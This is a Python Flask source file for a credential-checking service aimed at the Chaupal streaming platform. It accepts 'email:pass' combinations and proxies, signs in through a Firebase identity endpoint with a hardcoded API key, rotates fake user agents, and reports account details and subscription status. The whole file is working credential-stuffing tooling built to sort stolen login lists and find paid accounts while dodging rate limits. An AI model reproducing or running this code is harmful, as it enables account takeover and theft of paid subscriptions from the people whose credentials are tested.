from flask import Flask, request, jsonify
import requests
import datetime
import os
from fake_useragent import UserAgent

app = Flask(__name__)
ua = UserAgent()

def proxy_dict(proxy_str):
    try:
        ip, port, user, pwd = proxy_str.split(":", 3)
        proxy_auth = f"{user}:{pwd}@{ip}:{port}"
        proxy_url = f"http://{proxy_auth}"
        return {"http": proxy_url, "https": proxy_url}
    except:
        return None

def ms_to_date(ms):
    try:
        # Date only (no time)
        return datetime.datetime.utcfromtimestamp(int(ms)//1000).strftime("%Y-%m-%d")
    except:
        return ms

@app.route('/chaupal_check', methods=['GET', 'POST'])
def chaupal_check():
    # Supports GET, POST form, or POST JSON
    email_combo = (
        request.values.get('email', '') or
        (request.json.get('email', '') if request.is_json else '')
    )
    proxy_str = (
        request.values.get('proxy', '') or
        (request.json.get('proxy', '') if request.is_json else '')
    )
    proxies = proxy_dict(proxy_str) if proxy_str else None

    # Split email:pass
    if ':' not in email_combo:
        return jsonify({"status": "error", "message": "Invalid email param format (use email:pass)"}), 400
    email, password = email_combo.split(':', 1)

    # Step 1: Login
    login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCy9pm1PChZKOULywz9FBV1QD8MLZFc35c"
    login_payload = {
        "returnSecureToken": True,
        "email": email,
        "password": password
    }
    try:
        login_resp = requests.post(login_url, json=login_payload, proxies=proxies, timeout=30, headers={
            "User-Agent": ua.random
        })
        if login_resp.status_code != 200:
            try:
                error = login_resp.json()
                return jsonify({
                    "status": "error",
                    "message": error.get('error', {}).get('message', 'Unknown error')
                })
            except:
                return jsonify({"status": "error", "message": f"HTTP {login_resp.status_code}"})
        data = login_resp.json()
        id_token = data.get("idToken")
        if not id_token:
            return jsonify({"status": "error", "message": "No idToken in response!"})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Proxy/Login error: {str(e)}"})

    # Step 2: Get Account Info
    info_url = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyCy9pm1PChZKOULywz9FBV1QD8MLZFc35c"
    info_payload = {"idToken": id_token}
    try:
        info_resp = requests.post(info_url, json=info_payload, proxies=proxies, timeout=30, headers={
            "User-Agent": ua.random
        })
        if info_resp.status_code != 200:
            return jsonify({"status": "success", "message": "Login OK, failed to fetch info"})
        acc_info = info_resp.json()
        users = acc_info.get("users", [])
        user = users[0] if users else {}
    except Exception as e:
        return jsonify({"status": "success", "message": f"Login OK, info error: {str(e)}"})

    # Step 3: Chaupal Plan Info
    plan_url = "https://content.chaupal.tv/payments/subscription"
    plan_headers = {
        "authorization": f"Bearer {id_token}",
        "lang": "en",
        "origin": "https://chaupal.tv",
        "referer": "https://chaupal.tv/",
        "user-agent": ua.random,
        "x-client-version": "1.2.69",
        "x-platform": "WEB"
    }
    plan_data = None
    try:
        plan_resp = requests.get(plan_url, headers=plan_headers, proxies=proxies, timeout=30)
        if plan_resp.status_code == 200:
            plan_data = plan_resp.json()
        else:
            plan_data = None
    except Exception as e:
        plan_data = f"Plan API error: {str(e)}"

    resp = {
        "status": "success",
        "email": email,
        "email_verified": user.get('emailVerified', False),
        "created": ms_to_date(user.get('createdAt', 'N/A')),
        "last_login": ms_to_date(user.get('lastLoginAt', 'N/A')),
        "plan_info": plan_data,
    }
    return jsonify(resp)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
